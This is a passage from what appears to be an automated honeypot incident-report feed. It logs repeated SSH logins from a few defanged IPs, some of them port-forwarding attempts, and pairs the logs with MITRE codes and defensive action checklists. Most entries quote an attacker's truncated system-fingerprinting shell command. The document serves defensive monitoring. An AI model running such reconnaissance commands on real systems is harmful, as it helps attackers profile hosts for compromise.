| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:42:48` | `cowrie.session.connect` |
| `2026-07-24 20:42:49` | `cowrie.client.version` |
| `2026-07-24 20:42:49` | `cowrie.client.kex` |
| `2026-07-24 20:42:50` | `cowrie.login.success` |
| `2026-07-24 20:42:51` | `cowrie.session.params` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.success` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:51` | `cowrie.command.input` |
| `2026-07-24 20:42:52` | `cowrie.log.closed` |
| `2026-07-24 20:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36c54269735

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:43 |
| **Last Seen** | 2026-07-24 20:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:43:59` | `cowrie.session.connect` |
| `2026-07-24 20:43:59` | `cowrie.client.version` |
| `2026-07-24 20:43:59` | `cowrie.client.kex` |
| `2026-07-24 20:44:01` | `cowrie.login.success` |
| `2026-07-24 20:44:02` | `cowrie.session.params` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.success` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:02` | `cowrie.command.input` |
| `2026-07-24 20:44:03` | `cowrie.log.closed` |
| `2026-07-24 20:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a07ec0831e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:45 |
| **Last Seen** | 2026-07-24 20:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:45:09` | `cowrie.session.connect` |
| `2026-07-24 20:45:09` | `cowrie.client.version` |
| `2026-07-24 20:45:09` | `cowrie.client.kex` |
| `2026-07-24 20:45:11` | `cowrie.login.success` |
| `2026-07-24 20:45:12` | `cowrie.session.params` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.success` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:12` | `cowrie.command.input` |
| `2026-07-24 20:45:13` | `cowrie.log.closed` |
| `2026-07-24 20:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1e5f34af6e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-24 20:45 |
| **Last Seen** | 2026-07-24 20:45 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:45:11` | `cowrie.session.connect` |
| `2026-07-24 20:45:13` | `cowrie.client.version` |
| `2026-07-24 20:45:13` | `cowrie.client.kex` |
| `2026-07-24 20:45:23` | `cowrie.login.success` |
| `2026-07-24 20:45:28` | `cowrie.session.params` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.success` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:28` | `cowrie.command.input` |
| `2026-07-24 20:45:32` | `cowrie.log.closed` |
| `2026-07-24 20:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6adb3d5f49d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:46 |
| **Last Seen** | 2026-07-24 20:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:46:21` | `cowrie.session.connect` |
| `2026-07-24 20:46:21` | `cowrie.client.version` |
| `2026-07-24 20:46:21` | `cowrie.client.kex` |
| `2026-07-24 20:46:22` | `cowrie.login.success` |
| `2026-07-24 20:46:24` | `cowrie.session.params` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.success` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.command.input` |
| `2026-07-24 20:46:24` | `cowrie.log.closed` |
| `2026-07-24 20:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6bd1c1c9c6b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:47 |
| **Last Seen** | 2026-07-24 20:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:47:33` | `cowrie.session.connect` |
| `2026-07-24 20:47:33` | `cowrie.client.version` |
| `2026-07-24 20:47:33` | `cowrie.client.kex` |
| `2026-07-24 20:47:34` | `cowrie.login.success` |
| `2026-07-24 20:47:35` | `cowrie.session.params` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.success` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:35` | `cowrie.command.input` |
| `2026-07-24 20:47:36` | `cowrie.log.closed` |
| `2026-07-24 20:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44604776e1b7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:48 |
| **Last Seen** | 2026-07-24 20:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:48:46` | `cowrie.session.connect` |
| `2026-07-24 20:48:46` | `cowrie.client.version` |
| `2026-07-24 20:48:46` | `cowrie.client.kex` |
| `2026-07-24 20:48:48` | `cowrie.login.success` |
| `2026-07-24 20:48:49` | `cowrie.session.params` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.success` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:49` | `cowrie.command.input` |
| `2026-07-24 20:48:50` | `cowrie.log.closed` |
| `2026-07-24 20:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-761b3eeb0358

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-24 20:49 |
| **Last Seen** | 2026-07-24 20:50 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:49:35` | `cowrie.session.connect` |
| `2026-07-24 20:49:38` | `cowrie.client.version` |
| `2026-07-24 20:49:38` | `cowrie.client.kex` |
| `2026-07-24 20:49:54` | `cowrie.login.success` |
| `2026-07-24 20:49:57` | `cowrie.session.params` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.success` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:49:57` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.log.closed` |
| `2026-07-24 20:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1d6aa0a2ce

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:49 |
| **Last Seen** | 2026-07-24 20:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:49:58` | `cowrie.session.connect` |
| `2026-07-24 20:49:58` | `cowrie.client.version` |
| `2026-07-24 20:49:58` | `cowrie.client.kex` |
| `2026-07-24 20:49:59` | `cowrie.login.success` |
| `2026-07-24 20:50:00` | `cowrie.session.params` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.success` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.command.input` |
| `2026-07-24 20:50:00` | `cowrie.log.closed` |
| `2026-07-24 20:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d8f96c7f154

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:51 |
| **Last Seen** | 2026-07-24 20:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:51:11` | `cowrie.session.connect` |
| `2026-07-24 20:51:12` | `cowrie.client.version` |
| `2026-07-24 20:51:12` | `cowrie.client.kex` |
| `2026-07-24 20:51:13` | `cowrie.login.success` |
| `2026-07-24 20:51:15` | `cowrie.session.params` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.success` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.command.input` |
| `2026-07-24 20:51:15` | `cowrie.log.closed` |
| `2026-07-24 20:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6d64ba0cbd

| Field | Detail |
|---|---|
| **Source IP** | `200.222.71[.]218` |
| **First Seen** | 2026-07-24 20:52 |
| **Last Seen** | 2026-07-24 20:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:52:24` | `cowrie.session.connect` |
| `2026-07-24 20:52:25` | `cowrie.client.version` |
| `2026-07-24 20:52:25` | `cowrie.client.kex` |
| `2026-07-24 20:52:27` | `cowrie.login.success` |
| `2026-07-24 20:52:28` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.222.71[.]218` to AbuseIPDB if not already reported
- [ ] Block `200.222.71[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5af6e6b3e92

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:52 |
| **Last Seen** | 2026-07-24 20:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:52:24` | `cowrie.session.connect` |
| `2026-07-24 20:52:25` | `cowrie.client.version` |
| `2026-07-24 20:52:25` | `cowrie.client.kex` |
| `2026-07-24 20:52:26` | `cowrie.login.success` |
| `2026-07-24 20:52:27` | `cowrie.session.params` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.success` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.command.input` |
| `2026-07-24 20:52:27` | `cowrie.log.closed` |
| `2026-07-24 20:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bdc2e127e0b

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-07-24 20:52 |
| **Last Seen** | 2026-07-24 20:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:52:33` | `cowrie.session.connect` |
| `2026-07-24 20:52:33` | `cowrie.client.version` |
| `2026-07-24 20:52:33` | `cowrie.client.kex` |
| `2026-07-24 20:52:36` | `cowrie.login.success` |
| `2026-07-24 20:52:36` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c7f25a42518

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-07-24 20:52 |
| **Last Seen** | 2026-07-24 20:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:52:38` | `cowrie.session.connect` |
| `2026-07-24 20:52:38` | `cowrie.client.version` |
